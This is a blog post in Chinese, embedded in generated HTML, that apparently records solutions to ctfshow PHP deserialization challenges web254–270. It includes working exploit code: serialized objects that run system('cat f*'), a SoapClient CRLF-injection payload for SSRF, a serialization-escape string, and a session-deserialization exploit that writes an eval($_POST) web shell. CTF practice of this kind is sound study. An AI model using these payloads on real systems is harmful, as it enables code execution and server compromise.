@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="序列化部分练手，避免手生">
+<meta property="og:type" content="article">
+<meta property="og:title" content="show序列化">
+<meta property="og:url" content="http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="序列化部分练手，避免手生">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-13T09:38:29.000Z">
+<meta property="article:modified_time" content="2021-01-15T07:52:39.577Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="CTFER小白选手">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>show序列化 | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          show序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-13 17:38:29" itemprop="dateCreated datePublished" datetime="2021-01-13T17:38:29+08:00">2021-01-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-15 15:52:39" itemprop="dateModified" datetime="2021-01-15T15:52:39+08:00">2021-01-15</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>序列化部分练手，避免手生<a id="more"></a></p>
+<h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>直接传参即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>没get到点，不知道考察啥</p>
+<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">cookie:user=O:<span class="number">11</span>:<span class="string">"ctfShowUser"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"isVip"</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//注意分号要进行编码</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>比上一题多了个条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"your flag is "</span>.$flag;</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure>
+
+<p>做一下修改即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">public</span> $isVip=<span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">$a-&gt;isVip=<span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p>两个类中都有<code>getInfo()</code>方法，能利用的是<code>blackDoor</code>类中的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $class;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">'system("cat f*");'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="string">'system("cat f*");'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//private改成了public</span></span><br><span class="line"><span class="comment">//正则匹配用+号绕过o:之后的数字匹配即可</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$vip = unserialize($_GET[<span class="string">'vip'</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure>
+
+<p>flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$xff = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">array_pop($xff);</span><br><span class="line">$ip = array_pop($xff);</span><br><span class="line"><span class="keyword">if</span>($ip!==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$token = $_POST[<span class="string">'token'</span>];</span><br><span class="line">	<span class="keyword">if</span>($token==<span class="string">'ctfshow'</span>)&#123;</span><br><span class="line">		file_put_contents(<span class="string">'flag.txt'</span>,$flag);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>考察序列化但是没有给类和方法，说明考察内置类，这里考察SoapClient反序列化+clrf打ssrf，下面是两篇参考文章</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_38154820&#x2F;article&#x2F;details&#x2F;106330082</span><br><span class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;CRLF%20Injection漏洞的利用与实例分析.html</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line"><span class="comment">//$post_string = 'data=something';</span></span><br><span class="line">$post_string = <span class="string">'token=ctfshow'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1,127.0.0.1'</span>,</span><br><span class="line">    <span class="comment">//'Cookie: PHPSESSID=my_session'</span></span><br><span class="line">    <span class="string">'UM_distinctid:176faec63301f9-04a3a854efc541-4c3f207e-144000-176faec6331407'</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>=&gt;<span class="string">"aaab"</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> urlencode($aaa);</span><br></pre></td></tr></table></figure>
+
+<p>传参给vip之后访问/flag.txt即可</p>
+<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p>正则匹配，直接将匹配内容传给参数即可</p>
+<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>序列化逃逸</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message.php</span></span><br><span class="line"><span class="keyword">if</span>($msg-&gt;token==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$umsg = str_replace(<span class="string">'fuck'</span>, <span class="string">'loveU'</span>, serialize($msg));</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>传参即可，访问message.php</p>
+<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p><a href="http://www.zip拿到了源码" target="_blank" rel="noopener">www.zip拿到了源码</a></p>
+<p>session序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_serialize引擎 a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">6</span>:<span class="string">"spoock"</span>;&#125;</span><br><span class="line">php引擎 name|s:<span class="number">6</span>:<span class="string">"spoock"</span>;</span><br><span class="line">php_binary引擎 names:<span class="number">6</span>:<span class="string">"spoock"</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#inc.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $status;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span><span class="params">($s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">"log-"</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">"使用"</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">"登陆"</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">"成功"</span>:<span class="string">"失败"</span>).<span class="string">"----"</span>.date_create()-&gt;format(<span class="string">'Y-m-d H:i:s'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写文件，可以写入一句话shell</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line">setcookie(<span class="string">"limit"</span>,base64_encode(<span class="string">'1'</span>));</span><br><span class="line">写入cookie</span><br><span class="line"><span class="comment">#check.php</span></span><br><span class="line">$_COOKIE[<span class="string">'limit'</span>] = base64_encode(base64_decode($_COOKIE[<span class="string">'limit'</span>])+<span class="number">1</span>);</span><br><span class="line">调用了cookie</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $status;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;username = <span class="string">'a.php'</span>;</span><br><span class="line">$a-&gt;password = <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">'|'</span>.serialize($a));</span><br><span class="line"><span class="comment">#fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czoyODoiPD9waHAgZXZhbCgkX1BPU1RbImNtZCJdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span><br></pre></td></tr></table></figure>
+
+<p>修改cookie，访问<code>index.php</code>再访问<code>check.php</code>，这里会生成<code>log-a.php</code>文件，访问就可以利用</p>
+<h3 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h3><p>和262一样，只不过多了个cookie验证，然后<code>$_cookie[]</code>换成了<code>$_SESSION[]</code></p>
+<h3 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h3><p>按地址传参，一个值改变另一个值都会相应发生变化</p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="string">'a'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h3><p>类名大小写不敏感</p>
+
+
+<h3 id="web267-270"><a href="#web267-270" class="headerlink" title="web267-270"></a>web267-270</h3><p>看Yii框架反序列化漏洞分析文章</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/" title="show序列化">http://yoursite.com/2021/01/13/show序列化/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/" rel="prev" title="安洵杯2020复现">
+      <i class="fa fa-chevron-left"></i> 安洵杯2020复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="next" title="Yii框架反序列化漏洞">
+      Yii框架反序列化漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
